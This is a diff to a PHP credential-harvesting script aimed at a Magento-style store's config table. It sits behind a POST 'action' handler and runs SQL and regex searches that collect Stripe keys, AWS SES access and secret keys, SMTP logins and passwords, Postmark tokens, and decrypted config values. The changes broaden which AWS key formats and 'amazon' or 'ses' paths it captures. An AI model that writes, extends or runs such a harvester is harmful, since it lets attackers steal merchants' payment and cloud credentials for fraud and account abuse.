@@ -482,16 +482,26 @@ if (!$isCLI && isset($_POST['action'])) {
                 OR value LIKE 'sk_test_%' 
                 OR value LIKE 'pk_test_%'",
             
-            "SELECT path, value, 'AWS_SES' as category FROM " . $dbCreds['prefix'] . "core_config_data 
+            "SELECT path, value, 'AWS_SES' as category FROM " . $dbCreds['prefix'] . "core_config_data
              WHERE (path LIKE '%smtp%' AND (path LIKE '%host%' OR path LIKE '%username%' OR path LIKE '%password%' OR path LIKE '%auth%' OR path LIKE '%port%' OR path LIKE '%from%'))
                 OR path LIKE '%trans_email/ident_general/email%'
-                OR path LIKE '%aws%' 
+                OR path LIKE '%aws%'
                 OR path LIKE '%ses%access%'
                 OR path LIKE '%ses%secret%'
                 OR path LIKE '%ses%region%'
+                OR path LIKE '%amazon%'
+                OR path LIKE '%amazonses%'
+                OR path LIKE '%amazon_ses%'
                 OR value LIKE 'AKIA%'
+                OR value LIKE 'ASIA%'
                 OR value LIKE '%smtp.%'
-                OR value LIKE '%mail.%'",
+                OR value LIKE '%mail.%'
+                OR value LIKE '%amazonaws.com%'
+                OR value LIKE '%email-smtp%'",
+
+            "SELECT path, value, 'AWS_KEYS' as category FROM " . $dbCreds['prefix'] . "core_config_data
+             WHERE value REGEXP '^(AKIA|ASIA)[A-Z0-9]{16}$'
+                OR value REGEXP '(AKIA|ASIA)[A-Z0-9]{16}'",
             
             "SELECT path, value, 'Postmark' as category FROM " . $dbCreds['prefix'] . "core_config_data 
              WHERE path LIKE '%postmark%' 
@@ -579,7 +589,7 @@ if (!$isCLI && isset($_POST['action'])) {
             
             if ($category === 'Stripe' || strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0) {
                 $stripe_keys[] = $r;
-            } elseif ($category === 'AWS_SES' || strpos($val, 'AKIA') === 0 || strpos($path, 'aws') !== false || strpos($path, 'ses') !== false) {
+            } elseif ($category === 'AWS_SES' || $category === 'AWS_KEYS' || strpos($val, 'AKIA') === 0 || strpos($val, 'ASIA') === 0 || preg_match('/(AKIA|ASIA)[A-Z0-9]{16}/', $val) || strpos($path, 'aws') !== false || strpos($path, 'ses') !== false || strpos($path, 'amazon') !== false) {
                 $aws_ses[] = $r;
             } elseif ($category === 'Postmark' || strpos($val, 'postmark') !== false || strpos($path, 'postmark') !== false) {
                 $postmark[] = $r;
@@ -624,21 +634,21 @@ if (!$isCLI && isset($_POST['action'])) {
                 $val = $r['decrypted'];
                 $path = strtolower($r['path']);
                 
-                if (strpos($path, 'host') !== false && strpos($path, 'smtp') !== false) {
+                if (strpos($path, 'host') !== false && (strpos($path, 'smtp') !== false || strpos($path, 'amazon') !== false || strpos($path, 'ses') !== false)) {
                     $smtp_config['host'] = $val;
                 } elseif (strpos($path, 'port') !== false && (strpos($path, 'smtp') !== false || is_numeric($val))) {
                     $smtp_config['port'] = $val;
-                } elseif (strpos($path, 'username') !== false && strpos($path, 'smtp') !== false) {
+                } elseif (strpos($path, 'username') !== false && (strpos($path, 'smtp') !== false || strpos($path, 'amazon') !== false || strpos($path, 'ses') !== false)) {
                     $smtp_config['username'] = $val;
-                } elseif (strpos($path, 'password') !== false && strpos($path, 'smtp') !== false) {
+                } elseif (strpos($path, 'password') !== false && (strpos($path, 'smtp') !== false || strpos($path, 'amazon') !== false || strpos($path, 'ses') !== false)) {
                     $smtp_config['password'] = $val;
                 } elseif (strpos($path, 'authentication') !== false || (strpos($path, 'auth') !== false && strpos($path, 'smtp') !== false)) {
                     $smtp_config['authentication'] = $val;
-                } elseif (strpos($path, 'access_key') !== false || strpos($val, 'AKIA') === 0) {
+                } elseif (strpos($path, 'access_key') !== false || strpos($path, 'access_id') !== false || strpos($val, 'AKIA') === 0 || strpos($val, 'ASIA') === 0 || preg_match('/(AKIA|ASIA)[A-Z0-9]{16}/', $val)) {
                     $smtp_config['aws_access_key'] = $val;
-                } elseif (strpos($path, 'secret_key') !== false) {
+                } elseif (strpos($path, 'secret_key') !== false || strpos($path, 'secret_access') !== false) {
                     $smtp_config['aws_secret_key'] = $val;
-                } elseif (strpos($path, 'region') !== false && strpos($path, 'aws') !== false) {
+                } elseif (strpos($path, 'region') !== false && (strpos($path, 'aws') !== false || strpos($path, 'amazon') !== false || strpos($path, 'ses') !== false)) {
                     $smtp_config['aws_region'] = $val;
                 } elseif (strpos($val, '@') !== false && filter_var($val, FILTER_VALIDATE_EMAIL)) {
                     if (strpos($path, 'trans_email/ident_general/email') !== false || 
